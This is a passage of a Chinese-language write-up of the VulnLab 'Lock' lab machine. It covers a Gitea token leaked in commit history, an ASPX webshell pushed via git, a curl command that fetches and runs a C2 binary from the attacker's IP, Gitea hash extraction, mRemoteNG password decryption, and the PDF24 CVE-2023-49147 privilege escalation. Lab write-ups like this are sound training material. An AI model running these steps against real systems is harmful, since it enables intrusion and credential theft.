class="string">SF-Port3000-TCP:V=7.94SVN%I=7%D=1/2%Time=6775731D%P=x86_64-pc-linux-gnu%r(</span></span><br><span class="line"><span class="string">SF:GenericLines,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2</span><br><span class="line">SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad</span><br><span class="line">SF:\x20Request<span class="string">&quot;)%r(GetRequest,2E58,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nCache-Contro</span><br><span class="line">SF:l:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCon</span><br><span class="line">SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gite</span><br><span class="line">SF:a=3fb257f7e4944846;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook</span><br><span class="line">SF:ie:\x20_csrf=Yor2r4Gajh3LlnJud9L4jA66M7A6MTczNTc1MDQyNjYwNzY3NjMwMA;\x2</span><br><span class="line">SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opti</span><br><span class="line">SF:ons:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2001\x20Jan\x202025\x2016:53:46\x2</span><br><span class="line">SF:0GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20class=\&quot;them</span><br><span class="line">SF:e-auto\&quot;&gt;\n&lt;<span class="built_in">head</span>&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=devi</span><br><span class="line">SF:ce-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;title&gt;Gitea:\x20Git\x20with\x20a\x2</span><br><span class="line">SF:0cup\x20of\x20tea&lt;/title&gt;\n\t&lt;<span class="built_in">link</span>\x20rel=\&quot;manifest\&quot;\x20href=\&quot;data:a</span><br><span class="line">SF:pplication/json;<span class="built_in">base64</span>,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRl</span><br><span class="line">SF:YSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnR</span><br><span class="line">SF:fdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi</span><br><span class="line">SF:8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wb</span><br><span class="line">SF:mciLCJzaXplcyI6IjU<span class="string">&quot;)%r(Help,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nC</span><br><span class="line">SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\</span><br><span class="line">SF:n\r\n400\x20Bad\x20Request<span class="string">&quot;)%r(HTTPOptions,1A4,&quot;</span>HTTP/1\.0\x20405\x20Met</span><br><span class="line">SF:hod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20</span><br><span class="line">SF:GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20</span><br><span class="line">SF:no-transform\r\nSet-Cookie:\x20i_like_gitea=c17a643cc38f39c3;\x20Path=/</span><br><span class="line">SF:;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=U8t3ZO7IKDJvomM4</span><br><span class="line">SF:IFah3rUtk_Y6MTczNTc1MDQzMjQ2NTk4MTYwMA;\x20Path=/;\x20Max-Age=86400;\x2</span><br><span class="line">SF:0HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x</span><br><span class="line">SF:20Wed,\x2001\x20Jan\x202025\x2016:53:52\x20GMT\r\nContent-Length:\x200\</span><br><span class="line">SF:r\n\r\n<span class="string">&quot;)%r(RTSPRequest,67,&quot;</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte</span><br><span class="line">SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\</span><br><span class="line">SF:n400\x20Bad\x20Request<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>發現 80 個 3000 端口是開著的，還有RDP也是開著的。</p>
+<h1 id="There’s-nothing-on-port-80"><a href="#There’s-nothing-on-port-80" class="headerlink" title="There’s nothing on port 80"></a>There’s nothing on port 80</h1><p>80端口：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102004853-ibfbt2q.png" alt="image">​</p>
+<p>裏面看起來啥也沒，按鈕都是假的。</p>
+<h1 id="Find-the-personal-token-in-a-project-on-history-commit-with-gitea"><a href="#Find-the-personal-token-in-a-project-on-history-commit-with-gitea" class="headerlink" title="Find the personal token in a project on history commit with gitea"></a>Find the personal token in a project on history commit with gitea</h1><p>來到 3000 發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102004947-otmye13.png" alt="image">​</p>
+<p>打開該項目后顯示：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005000-gtjmt2x.png" alt="image">​</p>
+<p>值得注意的是這裏顯示了 <code>2 commits</code>​，所以看一下歷史的提交記錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005015-25dnsc0.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERSONAL_ACCESS_TOKEN = <span class="string">&#x27;43ce39bb0bd6bc489284f2905f033ca467a6362f&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>找到了一個 token ，點擊 parent 右邊的 <code>dcc869b175</code>​ 會來到原始的文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005659-wcaqie6.png" alt="image">​</p>
+<p>所以點擊 <code>View File</code>​后得到未修改的文件，下載下來：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005709-lwlcfim.png" alt="image">​</p>
+<h1 id="Running-a-historically-modified-file-reveals-another-project"><a href="#Running-a-historically-modified-file-reveals-another-project" class="headerlink" title="Running a historically modified file reveals another project"></a>Running a historically modified file reveals another project</h1><p>嘗試本地運行一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102005717-rcafdvt.png" alt="image">​</p>
+<p>發現這個用戶還有另一個項目叫 <code>website</code>​，但是現在沒有密碼，只有 <code>token</code>​，</p>
+<p>​<code>git</code>​ 其實允許 <code>token</code>​ 當作密碼用，格式如下：</p>
+<p> <code>git clone https://&lt;username&gt;:&lt;token&gt;@&lt;gitea-domain&gt;/&lt;owner&gt;/&lt;repository&gt;.git</code>​</p>
+<p>所以按照這個格式后，嘗試 clone 那個 <code>website</code>​ 的項目：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.82.171:3000/ellen.freeman/website.git</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010233-jwbdff4.png" alt="image">​</p>
+<p>使用 vscode 打開，看一下修改的内容，發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010337-yikseo0.png" alt="image">​</p>
+<p>這裏的提示告訴你，儅你修改項目了之後 push 上去，網站的服務器就會同步該項目。</p>
+<p>這個項目裏面有一個 <code>changelog.txt</code>​ ，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102235257-gel5u51.png" alt="image">​</p>
+<p>嘗試去瀏覽器訪問看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010524-tiipuny.png" alt="image">​</p>
+<p>既然存在，那就嘗試修改該文件，隨便加一點東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010549-z8sfsbn.png" alt="image">​</p>
+<p>之後提交更改：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;mane update&quot;</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010558-d2yhrtp.png" alt="image">​</p>
+<p>等一段時間后，在嘗試訪問一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010613-wkvrtse.png" alt="image">​</p>
+<p>結果還真的更改了。</p>
+<h1 id="Upload-webshell-with-GIT"><a href="#Upload-webshell-with-GIT" class="headerlink" title="Upload webshell with GIT"></a>Upload webshell with GIT</h1><p>既然可以成功的修改了服務器的文件，那就隨便敲一下，看一下是什麽服務器：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010624-ek907f1.png" alt="image">​</p>
+<p>可以看到是 IIS 服務器，可以直接傳一個 aspx 的shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cp</span> /usr/share/webshells/aspx/cmdasp.aspx .</span><br><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">&quot;mane update again&quot;</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010757-qhf9x9n.png" alt="image">​</p>
+<h1 id="Get-reverse-shell-on-webshell"><a href="#Get-reverse-shell-on-webshell" class="headerlink" title="Get reverse shell on webshell"></a>Get reverse shell on webshell</h1><p>等一段時間后打開，就獲得了webshell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102010919-5m8d2e5.png" alt="image">​</p>
+<p>所以傳一個 c2 上去運行一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> C:\mane</span><br><span class="line">curl http://10.8.4.212/mane.exe -o C:\mane\mane.exe</span><br><span class="line">C:\mane\mane.exe</span><br></pre></td></tr></table></figure>
+
+<h1 id="Crack-the-password-for-gitea-db-but-failed"><a href="#Crack-the-password-for-gitea-db-but-failed" class="headerlink" title="Crack the password for gitea.db but failed"></a>Crack the password for gitea.db but failed</h1><p>在 <code>C:\gitea\data</code>​ 裏面發現了 <code>gitea.db</code>​，也就是 gitea 的數據庫：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102011324-ktra236.png" alt="image">​</p>
+<p>下載下來后發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102011434-6sq339n.png" alt="image">​</p>
+<p>根據<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash"> 0xdf </a>的辦法，運行下列命令就得到 hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlite3 gitea.db <span class="string">&quot;select passwd,salt,name from user&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> data; <span class="keyword">do</span> digest=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$data</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;|&#x27;</span> -f1 | xxd -r -p | <span class="built_in">base64</span>); salt=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$data</span>&quot;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;|&#x27;</span> -f2 | xxd -r -p | <span class="built_in">base64</span>); name=$(<span class="built_in">echo</span> <span class="variable">$data</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;|&#x27;</span> -f 3); <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;name&#125;</span>:sha256:50000:<span class="variable">$&#123;salt&#125;</span>:<span class="variable">$&#123;digest&#125;</span>&quot;</span>; <span class="keyword">done</span> | <span class="built_in">tee</span> gitea.hashes</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102235807-w29kmil.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sha256:50000:Bp7YsAUXVRu/j6TEZnclfg==:3nJBIz8MqTa8C7lAGXZ475+OGOIHwNqAEzLn5AD95ZYwUDlVPR56FX5ocBv0JmBCIeA=</span><br><span class="line">sha256:50000:GXeV+QVa4jiTiJPqJGWvAg==:U2Ad1I+1j6jCVpBRrQjdB7K3f2Y0kFLyjhfMcS0xIrmD25uATHnkXlGZAqeUIdFKtv8=</span><br></pre></td></tr></table></figure>
+
+<p>然後放到 hashcat 嘗試破解，很可惜但是這兩個 hash 沒辦法 crack。</p>
+<h2 id="Using-gitea-command-to-change-admin-password"><a href="#Using-gitea-command-to-change-admin-password" class="headerlink" title="Using gitea command to change admin password"></a>Using gitea command to change admin password</h2><p>所以嘗試修改管理員的密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\gitea&gt; .\gitea admin user change-password -u administrator -p manesec.com</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102012051-z3obp6i.png" alt="image">​</p>
+<p>修改成功后登錄管理員：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020508-b51szms.png" alt="image">​</p>
+<p>但裏面什麽都沒有。</p>
+<h1 id="Found-mRemoteNG-config-on-current-users-documents"><a href="#Found-mRemoteNG-config-on-current-users-documents" class="headerlink" title="Found mRemoteNG config on current users documents"></a>Found mRemoteNG config on current users documents</h1><p>在 <code>C:\users</code>​ 列出所有的文件下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree /f /a</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013744-hpc7y2x.png" alt="image">​</p>
+<p>發現 <code>C:\users\ellen.freeman\documents</code>​ 有一個 <code>config.xml</code>​，查看後發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013822-1cfjfm2.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;mrng:Connections xmlns:mrng=<span class="string">&quot;http://mremoteng.org&quot;</span> Name=<span class="string">&quot;Connections&quot;</span> Export=<span class="string">&quot;false&quot;</span> EncryptionEngine=<span class="string">&quot;AES&quot;</span> BlockCipherMode=<span class="string">&quot;GCM&quot;</span> KdfIterations=<span class="string">&quot;1000&quot;</span> FullFileEncryption=<span class="string">&quot;false&quot;</span> Protected=<span class="string">&quot;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&quot;</span> ConfVersion=<span class="string">&quot;2.6&quot;</span>&gt;</span><br><span class="line">    &lt;Node Name=<span class="string">&quot;RDP/Gale&quot;</span> Type=<span class="string">&quot;Connection&quot;</span> Descr=<span class="string">&quot;&quot;</span> Icon=<span class="string">&quot;mRemoteNG&quot;</span> Panel=<span class="string">&quot;General&quot;</span> Id=<span class="string">&quot;a179606a-a854-48a6-9baa-491d8eb3bddc&quot;</span> Username=<span class="string">&quot;Gale.Dekarios&quot;</span> Domain=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==&quot;</span> Hostname=<span class="string">&quot;Lock&quot;</span> Protocol=<span class="string">&quot;RDP&quot;</span> PuttySession=<span class="string">&quot;Default Settings&quot;</span> Port=<span class="string">&quot;3389&quot;</span> ConnectToConsole=<span class="string">&quot;false&quot;</span> UseCredSsp=<span class="string">&quot;true&quot;</span> RenderingEngine=<span class="string">&quot;IE&quot;</span> ICAEncryptionStrength=<span class="string">&quot;EncrBasic&quot;</span> RDPAuthenticationLevel=<span class="string">&quot;NoAuth&quot;</span> RDPMinutesToIdleTimeout=<span class="string">&quot;0&quot;</span> RDPAlertIdleTimeout=<span class="string">&quot;false&quot;</span> LoadBalanceInfo=<span class="string">&quot;&quot;</span> Colors=<span class="string">&quot;Colors16Bit&quot;</span> Resolution=<span class="string">&quot;FitToWindow&quot;</span> AutomaticResize=<span class="string">&quot;true&quot;</span> DisplayWallpaper=<span class="string">&quot;false&quot;</span> DisplayThemes=<span class="string">&quot;false&quot;</span> EnableFontSmoothing=<span class="string">&quot;false&quot;</span> EnableDesktopComposition=<span class="string">&quot;false&quot;</span> CacheBitmaps=<span class="string">&quot;false&quot;</span> RedirectDiskDrives=<span class="string">&quot;false&quot;</span> RedirectPorts=<span class="string">&quot;false&quot;</span> RedirectPrinters=<span class="string">&quot;false&quot;</span> RedirectSmartCards=<span class="string">&quot;false&quot;</span> RedirectSound=<span class="string">&quot;DoNotPlay&quot;</span> SoundQuality=<span class="string">&quot;Dynamic&quot;</span> RedirectKeys=<span class="string">&quot;false&quot;</span> Connected=<span class="string">&quot;false&quot;</span> PreExtApp=<span class="string">&quot;&quot;</span> PostExtApp=<span class="string">&quot;&quot;</span> MacAddress=<span class="string">&quot;&quot;</span> UserField=<span class="string">&quot;&quot;</span> ExtApp=<span class="string">&quot;&quot;</span> VNCCompression=<span class="string">&quot;CompNone&quot;</span> VNCEncoding=<span class="string">&quot;EncHextile&quot;</span> VNCAuthMode=<span class="string">&quot;AuthVNC&quot;</span> VNCProxyType=<span class="string">&quot;ProxyNone&quot;</span> VNCProxyIP=<span class="string">&quot;&quot;</span> VNCProxyPort=<span class="string">&quot;0&quot;</span> VNCProxyUsername=<span class="string">&quot;&quot;</span> VNCProxyPassword=<span class="string">&quot;&quot;</span> VNCColors=<span class="string">&quot;ColNormal&quot;</span> VNCSmartSizeMode=<span class="string">&quot;SmartSAspect&quot;</span> VNCViewOnly=<span class="string">&quot;false&quot;</span> RDGatewayUsageMethod=<span class="string">&quot;Never&quot;</span> RDGatewayHostname=<span class="string">&quot;&quot;</span> RDGatewayUseConnectionCredentials=<span class="string">&quot;Yes&quot;</span> RDGatewayUsername=<span class="string">&quot;&quot;</span> RDGatewayPassword=<span class="string">&quot;&quot;</span> RDGatewayDomain=<span class="string">&quot;&quot;</span> InheritCacheBitmaps=<span class="string">&quot;false&quot;</span> InheritColors=<span class="string">&quot;false&quot;</span> InheritDescription=<span class="string">&quot;false&quot;</span> InheritDisplayThemes=<span class="string">&quot;false&quot;</span> InheritDisplayWallpaper=<span class="string">&quot;false&quot;</span> InheritEnableFontSmoothing=<span class="string">&quot;false&quot;</span> InheritEnableDesktopComposition=<span class="string">&quot;false&quot;</span> InheritDomain=<span class="string">&quot;false&quot;</span> InheritIcon=<span class="string">&quot;false&quot;</span> InheritPanel=<span class="string">&quot;false&quot;</span> InheritPassword=<span class="string">&quot;false&quot;</span> InheritPort=<span class="string">&quot;false&quot;</span> InheritProtocol=<span class="string">&quot;false&quot;</span> InheritPuttySession=<span class="string">&quot;false&quot;</span> InheritRedirectDiskDrives=<span class="string">&quot;false&quot;</span> InheritRedirectKeys=<span class="string">&quot;false&quot;</span> InheritRedirectPorts=<span class="string">&quot;false&quot;</span> InheritRedirectPrinters=<span class="string">&quot;false&quot;</span> InheritRedirectSmartCards=<span class="string">&quot;false&quot;</span> InheritRedirectSound=<span class="string">&quot;false&quot;</span> InheritSoundQuality=<span class="string">&quot;false&quot;</span> InheritResolution=<span class="string">&quot;false&quot;</span> InheritAutomaticResize=<span class="string">&quot;false&quot;</span> InheritUseConsoleSession=<span class="string">&quot;false&quot;</span> InheritUseCredSsp=<span class="string">&quot;false&quot;</span> InheritRenderingEngine=<span class="string">&quot;false&quot;</span> InheritUsername=<span class="string">&quot;false&quot;</span> InheritICAEncryptionStrength=<span class="string">&quot;false&quot;</span> InheritRDPAuthenticationLevel=<span class="string">&quot;false&quot;</span> InheritRDPMinutesToIdleTimeout=<span class="string">&quot;false&quot;</span> InheritRDPAlertIdleTimeout=<span class="string">&quot;false&quot;</span> InheritLoadBalanceInfo=<span class="string">&quot;false&quot;</span> InheritPreExtApp=<span class="string">&quot;false&quot;</span> InheritPostExtApp=<span class="string">&quot;false&quot;</span> InheritMacAddress=<span class="string">&quot;false&quot;</span> InheritUserField=<span class="string">&quot;false&quot;</span> InheritExtApp=<span class="string">&quot;false&quot;</span> InheritVNCCompression=<span class="string">&quot;false&quot;</span> InheritVNCEncoding=<span class="string">&quot;false&quot;</span> InheritVNCAuthMode=<span class="string">&quot;false&quot;</span> InheritVNCProxyType=<span class="string">&quot;false&quot;</span> InheritVNCProxyIP=<span class="string">&quot;false&quot;</span> InheritVNCProxyPort=<span class="string">&quot;false&quot;</span> InheritVNCProxyUsername=<span class="string">&quot;false&quot;</span> InheritVNCProxyPassword=<span class="string">&quot;false&quot;</span> InheritVNCColors=<span class="string">&quot;false&quot;</span> InheritVNCSmartSizeMode=<span class="string">&quot;false&quot;</span> InheritVNCViewOnly=<span class="string">&quot;false&quot;</span> InheritRDGatewayUsageMethod=<span class="string">&quot;false&quot;</span> InheritRDGatewayHostname=<span class="string">&quot;false&quot;</span> InheritRDGatewayUseConnectionCredentials=<span class="string">&quot;false&quot;</span> InheritRDGatewayUsername=<span class="string">&quot;false&quot;</span> InheritRDGatewayPassword=<span class="string">&quot;false&quot;</span> InheritRDGatewayDomain=<span class="string">&quot;false&quot;</span> /&gt;</span><br><span class="line">&lt;/mrng:Connections&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的 <code>Icon=&quot;mRemoteNG&quot;</code>​ 寫著是一個軟件，搜索了一下得到是 mRemoteNG</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102013933-5tf0lx1.png" alt="image">​</p>
+<h2 id="Decrypt-the-password-of-mRemoteNG-and-connect-RDP"><a href="#Decrypt-the-password-of-mRemoteNG-and-connect-RDP" class="headerlink" title="Decrypt the password of mRemoteNG and connect RDP"></a>Decrypt the password of mRemoteNG and connect RDP</h2><p>所以找一下解密的文件，找到： <a target="_blank" rel="noopener" href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p>
+<p>嘗試解密，得到 <code>Gale.Dekarios</code>​ 的密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014116-wdjm1im.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python3 mremoteng_decrypt.py config.xml  </span><br><span class="line">Name: RDP/Gale</span><br><span class="line">Hostname: Lock</span><br><span class="line">Username: Gale.Dekarios</span><br><span class="line">Password: ty8wnW9qCKDosXo6</span><br></pre></td></tr></table></figure>
+
+<p>由於這個是  <code>mRemoteNG</code>​ 的配置文件，於是想到了使用 rdp 連接看看，結果成功了：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014220-1q50xo4.png" alt="image">​</p>
+<h1 id="Exploit-PDF24-of-CVE-2023-49147-to-get-NT-SYSTEM"><a href="#Exploit-PDF24-of-CVE-2023-49147-to-get-NT-SYSTEM" class="headerlink" title="Exploit PDF24 of CVE-2023-49147 to get NT SYSTEM"></a>Exploit PDF24 of CVE-2023-49147 to get NT SYSTEM</h1><p>打開後發現大大的 <code>PDF24</code>​所以搜索一下 exploit：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102014309-b91dzoo.png" alt="image">​</p>
+<p>之後看到這篇：<a target="_blank" rel="noopener" href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a></p>
+<p>在第一步中告訴你：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000308-llaysp0.png" alt="image">​</p>
+<p>需要找到原始的安裝文件，剛好在 <code>C:\_install</code>​ 中發現了一個安裝目錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015628-890oxxt.png" alt="image">​</p>
+<p>裏面的 <code>pdf24-creator-11.5.1-x64.msi</code>​ 就是原始的安裝文件，接下來還需要 <code>SetOpLock</code>​，可以從<a target="_blank" rel="noopener" href="https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0">這裏</a>下載：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000502-yf2b2u0.png" alt="image">​</p>
+<p>下載完成后上傳到對面上，從 poc 中看出來要先使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetOpLock.exe <span class="string">&quot;C:\Program Files\PDF24\faxPrnInst.log&quot;</span> r</span><br></pre></td></tr></table></figure>
+
+<p>來鎖住 <code>C:\Program Files\PDF24\faxPrnInst.log</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015726-kwenkea.png" alt="image">​</p>
+<p>然後使用cmd開啓修復程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\_install\pdf24-creator-11.5.1-x64.msi</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015711-nckjqiv.png" alt="image">​</p>
+<p>等待，它會提示一些東西：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102015800-jblubln.png" alt="image">​</p>
+<p>一直按確定就要可以了，快結束了的時候會彈出黑框：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020012-8h4zpdd.png" alt="image">​</p>
+<p>可以按照上面的描述走：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250103000804-liq3s14.png" alt="image">​</p>
+<p>首先下面的第 1 - 3 點：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020125-62o7an8.png" alt="image">​</p>
+<p>上面的描述中第四點提到避免使用 edge 和 ie 打開，所以這裏選擇火狐：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020222-gblrcgl.png" alt="image">​</p>
+<p>這時候火狐就是使用 NT SYSTEM 來運行的，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020253-b7kuka3.png" alt="image">​</p>
+<p>然後根據第 5 點按下 <code>ctrl + o</code>​ 鍵：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020314-yzzz9ll.png" alt="image">​</p>
+<p>輸入 <code>cmd.exe</code>​ 之後回車，得到 <code>NTSystem</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/07-vulnlab-Lock/image-20250102020337-oqh1wh9.png" alt="image">​</p>
+<p>然後就可以去管理員的目錄下提取 <code>root.txt</code>​了。</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span 